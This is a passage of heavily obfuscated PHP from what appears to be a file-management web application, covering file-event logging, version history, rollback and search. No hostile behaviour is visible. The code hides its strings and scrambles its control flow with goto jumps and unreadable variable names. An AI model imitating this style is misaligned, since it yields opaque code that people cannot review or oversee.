"\151\156\x73\145\x72\164\x2c\165\160\x64\141\164\x65\54\163\x65\x6c\145\x63\x74", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($BŞİÇˆ¸ÌÌ, $BùÀİ²ÜÑ—, $AóÒÉÄùÁ÷ = '') { goto E“Š²ÈÓ†; CÃ‚œÙÆ: if (!$a¤İ†Õ‡ˆÎ) { return !1; } if ($this->isCacheEvent($a¤İ†Õ‡ˆÎ, $BùÀİ²ÜÑ—)) { return; } if ($AóÒÉÄùÁ÷ && is_string($AóÒÉÄùÁ÷)) { $AóÒÉÄùÁ÷ = array($báŠÍ›‹‡†[2102] => $AóÒÉÄùÁ÷); } goto CæÄ‘Œò»ƒ; E“Š²ÈÓ†: $báŠÍ›‹‡† =& $_SERVER[Ìó]; if (!$this->eventSave) { return; } $a¤İ†Õ‡ˆÎ = Model($báŠÍ›‹‡†[1106])->sourceInfo($BŞİÇˆ¸ÌÌ); goto CÃ‚œÙÆ; CæÄ‘Œò»ƒ: $A¾²šé·¬… = array($báŠÍ›‹‡†[379] => $BŞİÇˆ¸ÌÌ, $báŠÍ›‹‡†[2237] => $a¤İ†Õ‡ˆÎ[$báŠÍ›‹‡†[456]], $báŠÍ›‹‡†[2238] => $a¤İ†Õ‡ˆÎ[$báŠÍ›‹‡†[28]], $báŠÍ›‹‡†[461] => $a¤İ†Õ‡ˆÎ[$báŠÍ›‹‡†[461]], $báŠÍ›‹‡†[1400] => USER_ID, $báŠÍ›‹‡†[384] => $BùÀİ²ÜÑ—, $báŠÍ›‹‡†[1402] => $AóÒÉÄùÁ÷); $this->addSystemLog($BùÀİ²ÜÑ—, $A¾²šé·¬…); return $this->add($A¾²šé·¬…); goto Eƒ…ƒ¸¸˜÷; Eƒ…ƒ¸¸˜÷: } private function addSystemLog($AË¼‘Ìóô, $d©…ÀŞ‘) { $FñŠ“Øİ =& $_SERVER[Ìó]; if ($AË¼‘Ìóô == $FñŠ“Øİ[2239]) { $AË¼‘Ìóô = $d©…ÀŞ‘[$FñŠ“Øİ[400]][$FñŠ“Øİ[2240]]; } else { if (in_array($AË¼‘Ìóô, array($FñŠ“Øİ[2049], $FñŠ“Øİ[2241]))) { $AË¼‘Ìóô = $d©…ÀŞ‘[$FñŠ“Øİ[400]][$FñŠ“Øİ[688]]; } } $CÆëç×Ê˜¥ = array_merge($d©…ÀŞ‘, array($FñŠ“Øİ[2242] => $d©…ÀŞ‘[$FñŠ“Øİ[365]], $FñŠ“Øİ[2243] => $d©…ÀŞ‘[$FñŠ“Øİ[2243]])); Model($FñŠ“Øİ[2013])->addLog($FñŠ“Øİ[2244] . $AË¼‘Ìóô, $CÆëç×Ê˜¥); } private function isCacheEvent($F§¥³¤®°, $a¿­ğ­îÃ) { if ($F§¥³¤®°[$_SERVER[Ìó][367]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($e©ïèŸ–ø¤, $DäÑ¼Òƒ™À) { $A‚ìøÜÃ =& $_SERVER[Ìó]; $EÄß´ÙÒ¥— = Model($A‚ìøÜÃ[1106])->sourceInfo($e©ïèŸ–ø¤); $e½ÕÆµæĞè = array($A‚ìøÜÃ[2240] => $DäÑ¼Òƒ™À, $A‚ìøÜÃ[28] => $EÄß´ÙÒ¥—[$A‚ìøÜÃ[28]]); return $this->addEvent($e©ïèŸ–ø¤, $A‚ìøÜÃ[2239], $e½ÕÆµæĞè); } public function eventFileEdit($fÕ””ÏÙùö) { $dÚùÊãøì =& $_SERVER[Ìó]; $aÆ÷¤‹°âÕ = array($dÚùÊãøì[2245] => $_SERVER[$dÚùÊãøì[2246]], $dÚùÊãøì[1719] => strtolower(ACTION)); return $this->addEvent($fÕ””ÏÙùö, $dÚùÊãøì[2040], $aÆ÷¤‹°âÕ); } public function eventRecycle($b®ÖŞÑ•ä, $EÙ Ò¹çÎæ) { return $this->addEvent($b®ÖŞÑ•ä, $_SERVER[Ìó][2241], $EÙ Ò¹çÎæ); } public function eventRemove($EßÏÜ«¡¶) { $dè‚ŒÇœ×À =& $_SERVER[Ìó]; $eÑ—®½İ÷É = Model($dè‚ŒÇœ×À[1106])->sourceInfo($EßÏÜ«¡¶); $dä¯‡ÔªÇ = $eÑ—®½İ÷É[$dè‚ŒÇœ×À[28]]; return $this->addEvent($eÑ—®½İ÷É[$dè‚ŒÇœ×À[456]], $dè‚ŒÇœ×À[2039], $dä¯‡ÔªÇ); } public function eventShare($eóğà–éôØ, $eœ‘˜¡â½â) { return $this->addEvent($eóğà–éôØ, $_SERVER[Ìó][2049], $eœ‘˜¡â½â); } public function eventMove($e—±ªàÆê¸, $aØĞ¦á‹Çï, $CŒĞˆâ°Ø) { goto A—„×„¢‡À; A—„×„¢‡À: $EÇ‹Êåí =& $_SERVER[Ìó]; $C£¤Œ§óè¨ = Model($EÇ‹Êåí[1106]); $cÀëâ©šö = $C£¤Œ§óè¨->sourceInfo($e—±ªàÆê¸); goto Bî™õ•Ş—Û; Bî™õ•Ş—Û: $cÖœ¸®ƒ¿œ = $C£¤Œ§óè¨->sourceInfo($aØĞ¦á‹Çï); $D¶ÀÌ¾ö¯ = $C£¤Œ§óè¨->sourceInfo($CŒĞˆâ°Ø); $BôŠÔ÷çî‹ = array($EÇ‹Êåí[1002] => $aØĞ¦á‹Çï, $EÇ‹Êåí[2247] => $cÖœ¸®ƒ¿œ[$EÇ‹Êåí[28]], $EÇ‹Êåí[2248] => $cÖœ¸®ƒ¿œ[$EÇ‹Êåí[461]], $EÇ‹Êåí[1003] => $CŒĞˆâ°Ø, $EÇ‹Êåí[2249] => $D¶ÀÌ¾ö¯[$EÇ‹Êåí[28]], $EÇ‹Êåí[2250] => $D¶ÀÌ¾ö¯[$EÇ‹Êåí[461]]); goto c´ Ìä£·›; c´ Ìä£·›: $this->addEvent($e—±ªàÆê¸, $EÇ‹Êåí[487], $BôŠÔ÷çî‹); $cÀëâ©šö = $C£¤Œ§óè¨->sourceInfo($e—±ªàÆê¸); $BôŠÔ÷çî‹ = array($EÇ‹Êåí[365] => $cÀëâ©šö[$EÇ‹Êåí[365]], $EÇ‹Êåí[28] => $cÀëâ©šö[$EÇ‹Êåí[28]]); goto cÜ‚–êÚ¿; cÜ‚–êÚ¿: $this->addEvent($aØĞ¦á‹Çï, $EÇ‹Êåí[2251], $BôŠÔ÷çî‹); goto F‚çÅ”ÙÚÊ; F‚çÅ”ÙÚÊ: } public function eventCopy($Eª–å†‘Ù) { $this->eventCreate($Eª–å†‘Ù, $_SERVER[Ìó][485]); } public function eventRename($a´¼ğğ–¥, $C¥Ê‘ÜõŠ, $dİ×ĞÖºëí) { $cĞê²Šµù× =& $_SERVER[Ìó]; $e§¾ˆš İ¾ = array($cĞê²Šµù×[1002] => $C¥Ê‘ÜõŠ, $cĞê²Šµù×[1003] => $dİ×ĞÖºëí); return $this->addEvent($a´¼ğğ–¥, $cĞê²Šµù×[1118], $e§¾ˆš İ¾); } public function eventAddComment($Bí™Û†Š±¤, $D³À˜×ì³ê) { return $this->addEvent($Bí™Û†Š±¤, $_SERVER[Ìó][2252], $D³À˜×ì³ê); } public function eventAddDesc($d»”„·Òå, $CÌÕ¨“”«) { return $this->addEvent($d»”„·Òå, $_SERVER[Ìó][2253], $CÌÕ¨“”«); } public function listBySource($e°ô×ˆôùœ) { goto Aæš‹Åáª; dˆ¿‘§íµ¶: $cî«ÁÊÓÁÁ = $this->eventListParse($cî«ÁÊÓÁÁ, $e°ô×ˆôùœ); show_json($cî«ÁÊÓÁÁ); goto E“»‚Û‘Í; CÌÄ¯Èè‡«: if ($B‚ù²Òï‘Ğ[$dÄ†¹Â™[366]] == $dÄ†¹Â™[83]) { $bìØ‡Ÿù© = Model($dÄ†¹Â™[1106])->listSearchChildren($e°ô×ˆôùœ, 20000); $bìØ‡Ÿù©[] = $e°ô×ˆôùœ . $dÄ†¹Â™[357]; $Bæ’‘ÇªÈ´ = array($dÄ†¹Â™[365] => array($dÄ†¹Â™[7], $bìØ‡Ÿù©)); } $cî«ÁÊÓÁÁ = $this->where($Bæ’‘ÇªÈ´)->order($dÄ†¹Â™[2254])->selectPage(); if ($cî«ÁÊÓÁÁ[$dÄ†¹Â™[347]][$dÄ†¹Â™[348]] == 0) { $cî«ÁÊÓÁÁ[$dÄ†¹Â™[347]][$dÄ†¹Â™[348]] = 1; $cî«ÁÊÓÁÁ[$dÄ†¹Â™[350]] = array(array($dÄ†¹Â™[379] => $e°ô×ˆôùœ, $dÄ†¹Â™[2237] => $B‚ù²Òï‘Ğ[$dÄ†¹Â™[456]], $dÄ†¹Â™[1400] => $B‚ù²Òï‘Ğ[$dÄ†¹Â™[374]], $dÄ†¹Â™[384] => $dÄ†¹Â™[2255], $dÄ†¹Â™[385] => $B‚ù²Òï‘Ğ[$dÄ†¹Â™[183]], $dÄ†¹Â™[1402] => $dÄ†¹Â™[33])); } goto dˆ¿‘§íµ¶; Aæš‹Åáª: $dÄ†¹Â™ =& $_SERVER[Ìó]; $B‚ù²Òï‘Ğ = Model($dÄ†¹Â™[1106])->sourceInfo($e°ô×ˆôùœ); $Bæ’‘ÇªÈ´ = array($dÄ†¹Â™[379] => $e°ô×ˆôùœ); goto CÌÄ¯Èè‡«; E“»‚Û‘Í: } private function eventListParse($f¶ßÈéáœ, $FãÍÎš»îÆ) { goto D«î¾¥°½Å; B¤§ª†ß•”: $BÅ×¤·î¤ = Model($c‘Â“ÑŸİ³[748])->sourceListInfo($E¯‹Å‹ÒÓ, !0); foreach ($A²‚òˆë¼¨ as &$aíæÊ¸ïËğ) { if ($aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[29]] == $c‘Â“ÑŸİ³[487] && isset($aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[400]][$c‘Â“ÑŸİ³[1002]])) { $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[400]][$c‘Â“ÑŸİ³[1002]] = $BÅ×¤·î¤[$aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[400]][$c‘Â“ÑŸİ³[1002]]]; $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[400]][$c‘Â“ÑŸİ³[1003]] = $BÅ×¤·î¤[$aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[400]][$c‘Â“ÑŸİ³[1003]]]; } if ($aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[29]] == $c‘Â“ÑŸİ³[2251] && isset($aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[400]][$c‘Â“ÑŸİ³[365]])) { $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[400]][$c‘Â“ÑŸİ³[365]] = $BÅ×¤·î¤[$aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[400]][$c‘Â“ÑŸİ³[365]]]; } $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[387]] = $BÅ×¤·î¤[$aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[365]]]; $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[2256]] = $BÅ×¤·î¤[$aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[2243]]]; if ($aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[29]] == $c‘Â“ÑŸİ³[2039]) { $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[2256]] = $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[387]]; $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[2243]] = $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[2256]][$c‘Â“ÑŸİ³[365]]; $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[387]] = !1; $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[365]] = $c‘Â“ÑŸİ³[33]; } $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[2209]] = $AÕâ¼¶Ëµ·[$aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[1409]]]; } $f¶ßÈéáœ[$c‘Â“ÑŸİ³[350]] = $A²‚òˆë¼¨; goto BŸ¨Øâ ¸á; D«î¾¥°½Å: $c‘Â“ÑŸİ³ =& $_SERVER[Ìó]; $A²‚òˆë¼¨ = $f¶ßÈéáœ[$c‘Â“ÑŸİ³[350]]; $E¯‹Å‹ÒÓ = array_to_keyvalue($A²‚òˆë¼¨, $c‘Â“ÑŸİ³[33], $c‘Â“ÑŸİ³[365]); goto eº´×Ó›í; BŸ¨Øâ ¸á: return $f¶ßÈéáœ; goto C¨ ”îäÃµ; dğä‰´¡ê: $E¯‹Å‹ÒÓ = array_unique($E¯‹Å‹ÒÓ); $aÚÎ£”½˜ = array_unique(array_to_keyvalue($A²‚òˆë¼¨, $c‘Â“ÑŸİ³[33], $c‘Â“ÑŸİ³[1409])); $AÕâ¼¶Ëµ· = Model($c‘Â“ÑŸİ³[472])->userListInfo($aÚÎ£”½˜); goto B¤§ª†ß•”; eº´×Ó›í: $E²×‹ğÆùò = array_to_keyvalue($A²‚òˆë¼¨, $c‘Â“ÑŸİ³[33], $c‘Â“ÑŸİ³[2243]); foreach ($A²‚òˆë¼¨ as $aíæÊ¸ïËğ) { $fóëÎ¬°ù› = $aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[400]]; if ($aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[29]] == $c‘Â“ÑŸİ³[487] && isset($fóëÎ¬°ù›[$c‘Â“ÑŸİ³[1002]])) { $E¯‹Å‹ÒÓ[] = $fóëÎ¬°ù›[$c‘Â“ÑŸİ³[1002]] . $c‘Â“ÑŸİ³[33]; $E¯‹Å‹ÒÓ[] = $fóëÎ¬°ù›[$c‘Â“ÑŸİ³[1003]] . $c‘Â“ÑŸİ³[33]; } if ($aíæÊ¸ïËğ[$c‘Â“ÑŸİ³[29]] == $c‘Â“ÑŸİ³[2251] && isset($fóëÎ¬°ù›[$c‘Â“ÑŸİ³[365]])) { $E¯‹Å‹ÒÓ[] = $fóëÎ¬°ù›[$c‘Â“ÑŸİ³[365]] . $c‘Â“ÑŸİ³[33]; } } $E¯‹Å‹ÒÓ = array_merge($E¯‹Å‹ÒÓ, $E²×‹ğÆùò, array($FãÍÎš»îÆ . $c‘Â“ÑŸİ³[33])); goto dğä‰´¡ê; C¨ ”îäÃµ: } public function removeBySource($f·”Ê†¯á‘) { $f¸Âë“œâ• = array($_SERVER[Ìó][379] => $f·”Ê†¯á‘); $this->where($f¸Âë“œâ•)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\x72\143\x65\137\x68\x69\163\x74\157\162\x79"; public function addHistory($b‰¼ä×•‡×, $F§é¥Ô½  = '') { $bÀ½ø®ãµá =& $_SERVER[Ìó]; $CøÚã˜£áÜ = array($bÀ½ø®ãµá[379] => $b‰¼ä×•‡×[$bÀ½ø®ãµá[365]], $bÀ½ø®ãµá[1400] => isset($b‰¼ä×•‡×[$bÀ½ø®ãµá[375]]) ? $b‰¼ä×•‡×[$bÀ½ø®ãµá[375]] : $b‰¼ä×•‡×[$bÀ½ø®ãµá[374]], $bÀ½ø®ãµá[415] => $b‰¼ä×•‡×[$bÀ½ø®ãµá[414]], $bÀ½ø®ãµá[515] => $b‰¼ä×•‡×[$bÀ½ø®ãµá[77]], $bÀ½ø®ãµá[2257] => $F§é¥Ô½ ); $F®ºßøƒ‚Ä = $GLOBALS[$bÀ½ø®ãµá[6]][$bÀ½ø®ãµá[84]][$bÀ½ø®ãµá[2258]]; if ($F®ºßøƒ‚Ä > 1) { $this->historyAutoClear($CøÚã˜£áÜ[$bÀ½ø®ãµá[365]]); $this->add($CøÚã˜£áÜ); } Model($bÀ½ø®ãµá[2259])->eventFileEdit($b‰¼ä×•‡×[$bÀ½ø®ãµá[365]]); } private function historyAutoClear($B·Ø“˜Á£Ï) { goto e¾Ù¾¥¼åŸ; dãÌ¼†³Çä: $f©ïÀ¦ƒÁ… = array_to_keyvalue($dÉ˜ô‘×ˆ‚, $E³Ó¶ª±[33], $E³Ó¶ª±[414]); $f©ïÀ¦ƒÁ… = array_slice($f©ïÀ¦ƒÁ…, $Eß¶õ÷ö¼); if (!$dåÇŒÄ„•è || !$f©ïÀ¦ƒÁ…) { return; } goto eÈ‚‰ÖŠØ‘; eÈ‚‰ÖŠØ‘: $fãò—ÛÆµØ = array($E³Ó¶ª±[381] => array($E³Ó¶ª±[7], $dåÇŒÄ„•è)); $this->where($fãò—ÛÆµØ)->delete(); Model($E³Ó¶ª±[417])->remove($f©ïÀ¦ƒÁ…); goto eãÉ¬ğİøŸ; EÄ¢ªÒ†²Ú: if (!$dÉ˜ô‘×ˆ‚ || $Eß¶õ÷ö¼ >= count($dÉ˜ô‘×ˆ‚)) { return; } $dåÇŒÄ„•è = array_to_keyvalue($dÉ˜ô‘×ˆ‚, $E³Ó¶ª±[33], $E³Ó¶ª±[363]); $dåÇŒÄ„•è = array_slice($dåÇŒÄ„•è, $Eß¶õ÷ö¼); goto dãÌ¼†³Çä; dÑ­ñ›Ù¹: if ($Eß¶õ÷ö¼ >= 500) { return; } $fãò—ÛÆµØ = array($E³Ó¶ª±[379] => $B·Ø“˜Á£Ï); $dÉ˜ô‘×ˆ‚ = $this->field($E³Ó¶ª±[2262])->where($fãò—ÛÆµØ)->order($E³Ó¶ª±[2254])->select(); goto EÄ¢ªÒ†²Ú; e¾Ù¾¥¼åŸ: $E³Ó¶ª± =& $_SERVER[Ìó]; $D¼·ù ØŸŞ = Model($E³Ó¶ª±[1084])->get($E³Ó¶ª±[2260]); $F¥ÅéÌ¦àğ = $GLOBALS[$E³Ó¶ª±[6]][$E³Ó¶ª±[84]][$E³Ó¶ª±[2258]]; goto A«‡¡‹®À ; A«‡¡‹®À : $f¯‹ŠŒñ‹¼ = $D¼·ù ØŸŞ == $E³Ó¶ª±[2261] ? 3 : $F¥ÅéÌ¦àğ; if ($F¥ÅéÌ¦àğ <= 1) { $f¯‹ŠŒñ‹¼ = 1; } $Eß¶õ÷ö¼ = $f¯‹ŠŒñ‹¼ - 1; goto dÑ­ñ›Ù¹; eãÉ¬ğİøŸ: } public function listData($a·Í‚êèŞ¡) { goto C’ÏÓğ¶ÑÛ; cËîƒâ¸¡â: $a×Ø‘ÜæÅƒ = $this->field($c²°Ü¶ªÁˆ)->where($Båíìª¨•Í)->order($Fƒ’š¨“–[2254])->selectPage(); $this->_listAppendUser($a×Ø‘ÜæÅƒ[$Fƒ’š¨“–[350]]); $A‡¥ÃÃì–¹ = Model($Fƒ’š¨“–[1084])->get($Fƒ’š¨“–[2260]); goto eçã‡êò; eçã‡êò: $bª¿©•ØŒ‹ = 3; if ($A‡¥ÃÃì–¹ == $Fƒ’š¨“–[2261]) { $a×Ø‘ÜæÅƒ[$Fƒ’š¨“–[350]] = array_slice($a×Ø‘ÜæÅƒ[$Fƒ’š¨“–[350]], 0, $bª¿©•ØŒ‹); $a×Ø‘ÜæÅƒ[$Fƒ’š¨“–[347]] = array($Fƒ’š¨“–[2264] => 1, $Fƒ’š¨“–[2265] => 20, $Fƒ’š¨“–[2266] => 1, $Fƒ’š¨“–[2267] => count($a×Ø‘ÜæÅƒ[$Fƒ’š¨“–[350]])); } return $a×Ø‘ÜæÅƒ; goto f™èğ…Ü÷; C’ÏÓğ¶ÑÛ: $Fƒ’š¨“– =& $_SERVER[Ìó]; $Båíìª¨•Í = array($Fƒ’š¨“–[379] => $a·Í‚êèŞ¡); $c²°Ü¶ªÁˆ = $Fƒ’š¨“–[2263]; goto cËîƒâ¸¡â; f™èğ…Ü÷: } protected function _listAppendUser(&$F»º…ëª—Å) { $eµ¥‰Î¤éğ =& $_SERVER[Ìó]; $d´Øêµ²—‹ = array_to_keyvalue($F»º…ëª—Å, $eµ¥‰Î¤éğ[33], $eµ¥‰Î¤éğ[1409]); $Aô’â™—œÁ = Model($eµ¥‰Î¤éğ[472])->userListInfo($d´Øêµ²—‹); foreach ($F»º…ëª—Å as &$A®óéê‰Ç¡) { $F”àÎ…ÕÙš = $A®óéê‰Ç¡[$eµ¥‰Î¤éğ[1409]]; $A®óéê‰Ç¡[$eµ¥‰Î¤éğ[374]] = $Aô’â™—œÁ[$F”àÎ…ÕÙš] ? $Aô’â™—œÁ[$F”àÎ…ÕÙš] : !1; } } public function fileInfo($b®«Ü¼µ”) { $Bô‡ÑƒÀ•¼ =& $_SERVER[Ìó]; $FÕ‘ĞÑ’ó = $this->tablePrefix; $eÄ”ô‘Ùò = "{$FÕ‘ĞÑ’ó}\151\157\x5f\146\151\154\x65\40\146\x69\154\x65\163\x20\x6f\156\40\x66\151\x6c\x65\x73\56\x66\151\154\x65\x49\x44\40\x3d\40\x68\x69\x73\164\x6f\162\171\56\146\x69\154\145\x49\x44"; return $this->alias($Bô‡ÑƒÀ•¼[2268])->where(array($Bô‡ÑƒÀ•¼[381] => $b®«Ü¼µ”))->join($eÄ”ô‘Ùò, $Bô‡ÑƒÀ•¼[2269])->find(); } public function removeItem($e†¸³›ĞÄà) { $e„åƒŠİÉÂ =& $_SERVER[Ìó]; $eÏÜ‰¥éßÙ = array($e„åƒŠİÉÂ[381] => $e†¸³›ĞÄà); $B®à ¥ë’ = $this->where($eÏÜ‰¥éßÙ)->find(); if ($B®à ¥ë’) { $eÓå›ò¯®í = $this->where($eÏÜ‰¥éßÙ)->delete(); Model($e„åƒŠİÉÂ[417])->remove($B®à ¥ë’[$e„åƒŠİÉÂ[414]]); return $eÓå›ò¯®í; } return !1; } public function removeBySource($c“‹ËÕ‘Î¡) { goto Cñ¯†è—ÍØ; Cñ¯†è—ÍØ: $AëĞÊá««¬ =& $_SERVER[Ìó]; if (!$c“‹ËÕ‘Î¡) { return !1; } if (!is_array($c“‹ËÕ‘Î¡)) { $c“‹ËÕ‘Î¡ = array($c“‹ËÕ‘Î¡); } goto cÜöïÓØœÅ; fŠµ¼Òƒåğ: return !0; goto CÛË®òáÇ°; cÜöïÓØœÅ: $E®¬ôñŸ„ = array($AëĞÊá««¬[379] => array($AëĞÊá««¬[7], $c“‹ËÕ‘Î¡)); $Dš°£øÚ• = $this->field($AëĞÊá««¬[415])->where($E®¬ôñŸ„)->select(); if ($Dš°£øÚ•) { $this->where($E®¬ôñŸ„)->delete(); $CâäÖÂæÊ… = array_to_keyvalue($Dš°£øÚ•, $AëĞÊá««¬[33], $AëĞÊá««¬[414]); Model($AëĞÊá««¬[417])->remove($CâäÖÂæÊ…); } goto fŠµ¼Òƒåğ; CÛË®òáÇ°: } public function setDetail($f¦˜ïÔùÀî, $DĞêóİÜŸ») { $A¶ªÒÄåŞ¤ =& $_SERVER[Ìó]; return $this->where(array($A¶ªÒÄåŞ¤[381] => $f¦˜ïÔùÀî))->save(array($A¶ªÒÄåŞ¤[2257] => $DĞêóİÜŸ»)); } public function rollbackToItem($F±¹¤¿‹ÑÍ, $D ÜåÀ¸½) { goto d·¤å†ºàÔ; c©ß–¨µİ: $C®×Åç…– = $this->find($D ÜåÀ¸½); $f¦ÜĞ²Æƒ‹ = array($CÄª¤ğÇİî[414] => $C®×Åç…–[$CÄª¤ğÇİî[414]], $CÄª¤ğÇİî[77] => $C®×Åç…–[$CÄª¤ğÇİî[77]], $CÄª¤ğÇİî[106] => time(), $CÄª¤ğÇİî[375] => USER_ID); Model($CÄª¤ğÇİî[748])->where(array($CÄª¤ğÇİî[365] => $F±¹¤¿‹ÑÍ))->save($f¦ÜĞ²Æƒ‹); goto EÁá«èí“; EÁá«èí“: return $this->where(array($CÄª¤ğÇİî[381] => $D ÜåÀ¸½))->delete(); goto f¦Ã©ŞˆŒ; d·¤å†ºàÔ: $CÄª¤ğÇİî =& $_SERVER[Ìó]; $AÆæÒ¦‹‚ = Model($CÄª¤ğÇİî[748])->sourceInfo($F±¹¤¿‹ÑÍ); $this->addHistory($AÆæÒ¦‹‚); goto c©ß–¨µİ; f¦Ã©ŞˆŒ: } public function clearSame($C…¦ä”êÂ®) { goto d‰ÉÉæ³‰Š; fÍË¶ßÓ: if (!$eĞÊ‘ê) { return; } $this->where(array($D¸¶ÊÌí‹É[363] => array($D¸¶ÊÌí‹É[7], $eĞÊ‘ê)))->delete(); Model($D¸¶ÊÌí‹É[417])->remove($DÕÓÒ­ØÍ); goto B‘ø±æŸÂ; f§Ü‡äáˆÖ: $DÕÓÒ­ØÍ = array(); $eĞÊ‘ê = array(); foreach ($d¨¸Ï‡¸Í´ as $C¦»ßµÑ¶) { if (!$C¦»ßµÑ¶ || count($C¦»ßµÑ¶) <= 1) { continue; } foreach ($C¦»ßµÑ¶ as $cø­ÒµÂ‚Ä) { $DÕÓÒ­ØÍ[] = $cø­ÒµÂ‚Ä[$D¸¶ÊÌí‹É[414]]; $eĞÊ‘ê[] = $cø­ÒµÂ‚Ä[$D¸¶ÊÌí‹É[363]]; } } goto fÍË¶ßÓ; d‰ÉÉæ³‰Š: $D¸¶ÊÌí‹É =& $_SERVER[Ìó]; $e·ØÃŸšôŸ = $this->listData($C…¦ä”êÂ®); $d¨¸Ï‡¸Í´ = array_to_keyvalue_group($e·ØÃŸšôŸ, $D¸¶ÊÌí‹É[414]); goto f§Ü‡äáˆÖ; B‘ø±æŸÂ: } public function userSpace() { $a¹·šŠ‹à½ =& $_SERVER[Ìó]; $E„Å²ƒŞµº = $this->tablePrefix; $aã­ìÃ£¸ = array($a¹·šŠ‹à½[1400] => USER_ID); $bêÊ’‘‘ì˜ = "{$E„Å²ƒŞµº}\151\157\x5f\x66\151\154\145\40\146\x69\x6c\145\x73\x20\x6f\x6e\x20\146\x69\x6c\x65\163\56\146\151\x6c\x65\x49\x44\40\75\40\x68\151\163\164\x6f\162\171\x2e\146\151\x6c\145\x49\104"; return $this->alias($a¹·šŠ‹à½[2268])->where($aã­ìÃ£¸)->join($bêÊ’‘‘ì˜, $a¹·šŠ‹à½[2269])->sum($a¹·šŠ‹à½[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($F“©‰Ëºš) { goto CŠ¼ÏäĞ«Â; eÉ†¿Ú¿á: if (!$Cœ¦–‚…·”[$A‚¥ˆ‰øßø[156]]) { $C‰–§öº„ö = array_to_keyvalue($d‹øÙ‰ºîø, $A‚¥ˆ‰øßø[33], $A‚¥ˆ‰øßø[156]); $D±âİÑô»Ä = implode($A‚¥ˆ‰øßø[47], $C‰–§öº„ö); $fˆí½ªç” = $A‚¥ˆ‰øßø[2226]; } $cØÛ¡ó‚‘ = explode($A‚¥ˆ‰øßø[47], trim($D±âİÑô»Ä, $A‚¥ˆ‰øßø[47])); return array($fˆí½ªç”, $cØÛ¡ó‚‘); goto E¯æ ŸÄÜÊ; BöáÖäõİ™: if (!$Cœ¦–‚…·”) { return array(); } $D±âİÑô»Ä = $Cœ¦–‚…·”[$A‚¥ˆ‰øßø[156]]; $fˆí½ªç” = $A‚¥ˆ‰øßø[7]; goto eÉ†¿Ú¿á; CŠ¼ÏäĞ«Â: $A‚¥ˆ‰øßø =& $_SERVER[Ìó]; $d‹øÙ‰ºîø = KodIO::fileTypeList(); $Cœ¦–‚…·” = $d‹øÙ‰ºîø[$F“©‰Ëºš]; goto BöáÖäõİ™; E¯æ ŸÄÜÊ: } public function listPathType($aµ¸ŞÒ¦œå) { $A­âÙùè†à =& $_SERVER[Ìó]; $C¹‡ÕÛÖ›„ = $this->fileTypeWhere($aµ¸ŞÒ¦œå); if (!$C¹‡ÕÛÖ›„) { return array(); } $AºÊºÏ‡àª = array($A­âÙùè†à[516] => SourceModel::TYPE_USER, $A­âÙùè†à[517] => USER_ID, $A­âÙùè†à[513] => 0, $A­âÙùè†à[514] => $C¹‡ÕÛÖ›„); return $this->listSource($AºÊºÏ‡àª); } public function listSearch($e¥ÈÛ¹Ô½Ø, $cÔˆ·Ÿóš‰ = 300) { goto F‰«Õ‹†¹’; Aóâ¹êˆÇ: if (!isset($eİœĞ³çŸ“[$c°…‘ª ­[392]])) { $eİœĞ³çŸ“[$c°…‘ª ­[392]] = 0; } $DîŞôø¸² = $c°…‘ª ­[2271]; $b´ç‰åóÛ¥ = $DîŞôø¸²; goto C“ƒ§ˆîĞÎ; F‰«Õ‹†¹’: $c°…‘ª ­ =& $_SERVER[Ìó]; if (isset($e¥ÈÛ¹Ô½Ø[$c°…‘ª ­[2148]]) && $e¥ÈÛ¹Ô½Ø[$c°…‘ª ­[2148]]) { $e¥ÈÛ¹Ô½Ø[$c°…‘ª ­[2148]] = str_replace($c°…‘ª ­[1561], $c°…‘ª ­[2270], trim($e¥ÈÛ¹Ô½Ø[$c°…‘ª ­[2148]])); } $eİœĞ³çŸ“ = $this->_parseSearchWhere($e¥ÈÛ¹Ô½Ø); goto Aóâ¹êˆÇ; C“ƒ§ˆîĞÎ: $this->_listSearchBindPinyin($e¥ÈÛ¹Ô½Ø, $eİœĞ³çŸ“, $DîŞôø¸²); $this->alias($c°…‘ª ­[482])->_makeOrder()->cache(null, 10); $e”ÀÁŠ¹Ë˜ = $this->distinct(!0)->field($DîŞôø¸²)->where($eİœĞ³çŸ“)->selectPage($cÔˆ·Ÿóš‰); goto FºĞœ¹Ì©Š; F¨³¹„µÑ: $this->_listMake($e”ÀÁŠ¹Ë˜); return $e”ÀÁŠ¹Ë˜; goto EÄ¸“ÖªÚÄ; FºĞœ¹Ì©Š: $this->_listSearchDesc($e”ÀÁŠ¹Ë˜, $e¥ÈÛ¹Ô½Ø, $b´ç‰åóÛ¥); $this->_listSearchTag($e”ÀÁŠ¹Ë˜, $e¥ÈÛ¹Ô½Ø, $b´ç‰åóÛ¥); $this->_listDataApply($e”ÀÁŠ¹Ë˜[$c°…‘ª ­[350]]); goto F¨³¹„µÑ; EÄ¸“ÖªÚÄ: } private function 